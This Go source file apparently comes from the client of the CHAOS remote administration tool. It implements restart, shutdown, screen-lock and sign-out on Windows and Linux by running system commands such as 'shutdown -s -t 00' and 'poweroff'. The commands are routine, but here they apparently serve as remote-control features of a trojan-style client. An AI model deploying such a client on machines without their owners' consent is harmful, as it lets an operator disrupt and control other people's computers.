package os

import (
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/services"
)

type OperatingSystemService struct {
	Configuration *environment.Configuration
	Terminal      services.Terminal
	OSType        OSType
}

func NewService(
	configuration *environment.Configuration,
	terminal services.Terminal,
	osType OSType,
) services.OS {
	return &OperatingSystemService{
		Configuration: configuration,
		Terminal:      terminal,
		OSType:        osType,
	}
}

func (os OperatingSystemService) Restart() error {
	switch os.OSType {
	case Windows:
		os.Terminal.Run("shutdown -r -t 00")
	case Linux:
		os.Terminal.Run("reboot")
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (os OperatingSystemService) Shutdown() error {
	switch os.OSType {
	case Windows:
		os.Terminal.Run("shutdown -s -t 00")
		break
	case Linux:
		os.Terminal.Run("poweroff")
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (os OperatingSystemService) Lock() error {
	switch os.OSType {
	case Windows:
		os.Terminal.Run("Rundll32.exe user32.dll,LockWorkStation")
		break
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}

func (os OperatingSystemService) SignOut() error {
	switch os.OSType {
	case Windows:
		os.Terminal.Run("shutdown -L")
		break
	default:
		return services.ErrUnsupportedPlatform
	}
	return nil
}
